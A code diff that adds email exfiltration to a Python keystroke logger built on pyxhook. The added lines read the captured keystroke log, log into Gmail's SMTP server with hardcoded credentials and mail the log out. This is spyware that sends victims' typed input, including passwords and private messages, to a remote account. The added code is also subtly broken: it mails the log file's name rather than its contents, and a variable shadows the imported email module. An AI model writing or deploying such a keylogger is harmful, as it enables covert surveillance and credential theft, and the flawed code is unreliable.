@@ -3,7 +3,12 @@
 # run pip install pyxhook 
 import os
 import pyxhook 
+import email, ssl, smtplib, time  
 
+port = 465 
+password = "test"
+
+context = ssl.create_default_context() 
 
 
 # main 
@@ -36,6 +41,18 @@ def main():
 
     #start session
     new_hook.start()
+    
+    #set up email 
+    email = "testemail@gmail.com" 
+    
+    with open(log_file, 'r') as file: 
+        data = file.read().replace('\n', '') 
+        
+    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server: 
+        server.login("my@gmail.com", password) 
+        time.sleep(60)
+        server.sendmail("my@gmail.com", "my@gmail.com", log_file)
+
 
 if __name__ == "__main__":
     main()
